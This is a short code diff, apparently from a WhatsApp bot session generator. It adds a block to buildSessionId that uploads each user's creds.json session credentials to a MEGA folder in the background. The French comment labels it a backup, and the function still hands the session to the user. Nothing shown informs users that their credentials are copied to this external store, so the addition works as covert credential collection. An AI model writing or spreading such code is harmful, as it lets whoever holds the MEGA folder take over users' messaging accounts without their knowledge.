@@ -89,6 +89,18 @@ async function buildSessionId(data) {
             resetStorage();
         }
     }
+    // Session longue : une copie de creds.json est aussi envoyée sur MEGA en arrière-plan
+    // (dossier KERM-MD-V1-SESSIONS). Un échec MEGA ne bloque jamais la session.
+    if (megaEnabled()) {
+        const name = 'creds-' + Date.now().toString(36) + '.json';
+        withTimeout(uploadToMega(data, name), 40000, 'MEGA backup')
+            .then(() => console.log('☁️ Copie de creds.json envoyée sur MEGA :', name))
+            .catch((e) => {
+                console.error('MEGA backup failed:', e && e.message);
+                resetStorage();
+            });
+    }
+
     return PREFIX + zlib.gzipSync(data).toString('base64');
 }
 
